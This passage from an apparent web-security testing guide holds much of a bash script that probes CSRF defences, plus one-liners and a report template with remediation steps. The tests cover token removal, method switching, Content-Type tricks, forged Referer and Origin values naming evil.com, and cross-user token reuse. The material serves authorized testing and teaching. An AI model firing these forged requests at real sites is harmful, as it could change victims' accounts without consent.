    local EXTRA_ARGS="$2"
    local STATUS

    STATUS=$(eval "curl -s -o /dev/null -w '%{http_code}' $EXTRA_ARGS 2>/dev/null")
    
    if [[ "$STATUS" =~ ^(200|201|301|302|303)$ ]]; then
        echo -e "  \033[91m[BYPASS!] $NAME → HTTP $STATUS\033[0m" | tee -a "$OUTPUT"
        FINDINGS=$((FINDINGS + 1))
    else
        echo -e "  \033[92m[BLOCKED] $NAME → HTTP $STATUS\033[0m" | tee -a "$OUTPUT"
    fi
}

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 1: TOKEN VALIDATION" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

# Get baseline with valid token
echo "[*] Getting valid CSRF token..." | tee -a "$OUTPUT"
CSRF_TOKEN=$(curl -s -b "$COOKIE" "$TARGET" | grep -oP '(csrf_token|_token|authenticity_token|csrfmiddlewaretoken).*?value="([^"]+)"' | head -1 | grep -oP '"[^"]+"$' | tr -d '"')
echo "  Token: ${CSRF_TOKEN:-NOT FOUND}" | tee -a "$OUTPUT"

test_csrf "No token parameter" "-X POST -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "Empty token value" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token=' '$TARGET'"
test_csrf "Null string token" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token=null' '$TARGET'"
test_csrf "Zero token" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token=0' '$TARGET'"
test_csrf "Random token" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token=$(openssl rand -hex 32)' '$TARGET'"
test_csrf "Array parameter" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token[]=test' '$TARGET'"
test_csrf "Space token" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token=%20' '$TARGET'"
test_csrf "Unicode token" "-X POST -b '$COOKIE' -d '${POST_DATA}&csrf_token=%E2%9A%A1' '$TARGET'"

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 2: METHOD SWITCHING" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

test_csrf "POST → GET" "-b '$COOKIE' '${TARGET}?${POST_DATA}'"
test_csrf "POST → PUT" "-X PUT -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "POST → PATCH" "-X PATCH -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "POST → DELETE" "-X DELETE -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "GET + _method=POST" "-b '$COOKIE' '${TARGET}?${POST_DATA}&_method=POST'"
test_csrf "POST + X-HTTP-Method-Override: GET" "-X POST -b '$COOKIE' -H 'X-HTTP-Method-Override: GET' -d '$POST_DATA' '$TARGET'"

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 3: CONTENT-TYPE" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

test_csrf "text/plain" "-X POST -b '$COOKIE' -H 'Content-Type: text/plain' -d '$POST_DATA' '$TARGET'"
test_csrf "multipart/form-data" "-X POST -b '$COOKIE' -F '$(echo $POST_DATA | sed "s/&/' -F '/g" | sed "s/=/ =/g" | sed "s/ =/=/")' '$TARGET'"
test_csrf "application/json" "-X POST -b '$COOKIE' -H 'Content-Type: application/json' -d '{\"email\":\"attacker@evil.com\"}' '$TARGET'"
test_csrf "No Content-Type" "-X POST -b '$COOKIE' -H 'Content-Type:' -d '$POST_DATA' '$TARGET'"
test_csrf "text/xml" "-X POST -b '$COOKIE' -H 'Content-Type: text/xml' -d '<email>attacker@evil.com</email>' '$TARGET'"

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 4: REFERER VALIDATION" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

test_csrf "No Referer" "-X POST -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "Empty Referer" "-X POST -b '$COOKIE' -H 'Referer: ' -d '$POST_DATA' '$TARGET'"
test_csrf "Evil Referer" "-X POST -b '$COOKIE' -H 'Referer: https://evil.com' -d '$POST_DATA' '$TARGET'"
test_csrf "Target in path" "-X POST -b '$COOKIE' -H 'Referer: https://evil.com/$DOMAIN' -d '$POST_DATA' '$TARGET'"
test_csrf "Target in query" "-X POST -b '$COOKIE' -H 'Referer: https://evil.com/?ref=$DOMAIN' -d '$POST_DATA' '$TARGET'"
test_csrf "Target as subdomain" "-X POST -b '$COOKIE' -H 'Referer: https://$DOMAIN.evil.com' -d '$POST_DATA' '$TARGET'"
test_csrf "HTTP downgrade" "-X POST -b '$COOKIE' -H 'Referer: http://$DOMAIN' -d '$POST_DATA' '$TARGET'"

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 5: ORIGIN VALIDATION" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

test_csrf "No Origin" "-X POST -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "Null Origin" "-X POST -b '$COOKIE' -H 'Origin: null' -d '$POST_DATA' '$TARGET'"
test_csrf "Evil Origin" "-X POST -b '$COOKIE' -H 'Origin: https://evil.com' -d '$POST_DATA' '$TARGET'"
test_csrf "Target subdomain Origin" "-X POST -b '$COOKIE' -H 'Origin: https://sub.$DOMAIN' -d '$POST_DATA' '$TARGET'"
test_csrf "Target suffix Origin" "-X POST -b '$COOKIE' -H 'Origin: https://$DOMAIN.evil.com' -d '$POST_DATA' '$TARGET'"

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 6: CUSTOM HEADER BYPASS" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

test_csrf "No X-Requested-With" "-X POST -b '$COOKIE' -d '$POST_DATA' '$TARGET'"
test_csrf "Empty X-Requested-With" "-X POST -b '$COOKIE' -H 'X-Requested-With: ' -d '$POST_DATA' '$TARGET'"
test_csrf "Wrong X-Requested-With" "-X POST -b '$COOKIE' -H 'X-Requested-With: test' -d '$POST_DATA' '$TARGET'"

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "[*] SECTION 7: COOKIE ANALYSIS" | tee -a "$OUTPUT"
echo "──────────────────────────────────" | tee -a "$OUTPUT"

echo "  Set-Cookie headers:" | tee -a "$OUTPUT"
curl -sI "$TARGET" | grep -i "set-cookie" | while read line; do
    echo "    $line" | tee -a "$OUTPUT"
    if ! echo "$line" | grep -qi "samesite"; then
        echo "    \033[93m→ Missing SameSite attribute\033[0m" | tee -a "$OUTPUT"
    fi
    if ! echo "$line" | grep -qi "secure"; then
        echo "    \033[93m→ Missing Secure flag\033[0m" | tee -a "$OUTPUT"
    fi
done

# ============================================================
echo "" | tee -a "$OUTPUT"
echo "══════════════════════════════════════════════" | tee -a "$OUTPUT"
echo "[*] SCAN COMPLETE" | tee -a "$OUTPUT"
echo "[*] Total bypasses found: $FINDINGS" | tee -a "$OUTPUT"
echo "[*] Results saved to: $OUTPUT" | tee -a "$OUTPUT"
```

::

## One-Liner Quick Reference

::code-group

```bash [Token Removal]
curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=valid" -d "email=test@evil.com" https://target.com/account/email
```

```bash [Empty Token]
curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=valid" -d "email=test@evil.com&csrf_token=" https://target.com/account/email
```

```bash [Method Switch]
curl -s -o /dev/null -w "%{http_code}" -b "session=valid" "https://target.com/account/email?email=test@evil.com"
```

```bash [No Referer]
curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=valid" -H "Referer: " -d "email=test@evil.com" https://target.com/account/email
```

```bash [No Origin]
curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=valid" -H "Origin: " -d "email=test@evil.com" https://target.com/account/email
```

```bash [text/plain Body]
curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=valid" -H "Content-Type: text/plain" -d '{"email":"test@evil.com"}' https://target.com/api/user/email
```

```bash [SameSite Check]
curl -sI -c- https://target.com/login 2>&1 | grep -iE "set-cookie.*samesite"
```

```bash [X-Frame-Options Check]
curl -sI https://target.com/account/settings | grep -iE "(x-frame-options|frame-ancestors)"
```

```bash [CSRF Token Extract]
curl -s -b "session=valid" https://target.com/account/settings | grep -oP 'csrf.*?value="([^"]+)"' | head -5
```

```bash [Cross-User Token]
ATTACKER_TOKEN=$(curl -s -b "session=ATTACKER" https://target.com/settings | grep -oP 'value="([a-f0-9]{32,})"' | head -1 | tr -d 'value="'); curl -s -o /dev/null -w "%{http_code}" -X POST -b "session=VICTIM" -d "email=evil@evil.com&csrf_token=$ATTACKER_TOKEN" https://target.com/account/email
```

::

## Reporting Reference

::field-group
  :::field{name="Title" type="string"}
  Cross-Site Request Forgery (CSRF) — Anti-CSRF Protection Bypass
  :::

  :::field{name="Severity" type="string"}
  **High** (CVSS 3.1: 8.8 — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
  :::

  :::field{name="CWE Classification" type="string"}
  CWE-352: Cross-Site Request Forgery (CSRF)
  :::

  :::field{name="OWASP Mapping" type="string"}
  A01:2021 Broken Access Control
  :::

  :::field{name="Bypass Method" type="string"}
  [Specify: Token Removal / Method Switch / Content-Type / SameSite / Referer / Double-Submit / etc.]
  :::

  :::field{name="Impact" type="string"}
  Attacker can perform any state-changing action as the victim: password changes, email modifications, fund transfers, privilege escalation, account deletion, data exfiltration
  :::

  :::field{name="Proof of Concept" type="string"}
  See attached `csrf_poc.html` — when visited by authenticated user, performs [action] without victim interaction
  :::

  :::field{name="Remediation" type="string"}
  1. Implement synchronizer token pattern with per-session cryptographically random tokens
  2. Bind CSRF tokens to user sessions — validate token belongs to requesting session
  3. Use SameSite=Strict or SameSite=Lax on all session cookies
  4. Validate both Origin AND Referer headers as defense-in-depth
  5. Require re-authentication for sensitive actions
  6. Reject requests with non-standard Content-Types for form endpoints
  7. Use framework built-in CSRF protection consistently on ALL state-changing endpoints
  8. Add `Vary: Cookie` header to prevent cache-based CSRF
  :::

  :::field{name="References" type="string"}
  OWASP CSRF Prevention Cheat Sheet · PortSwigger CSRF Research · CWE-352 · RFC 7231 Section 4.2.1
  :::
::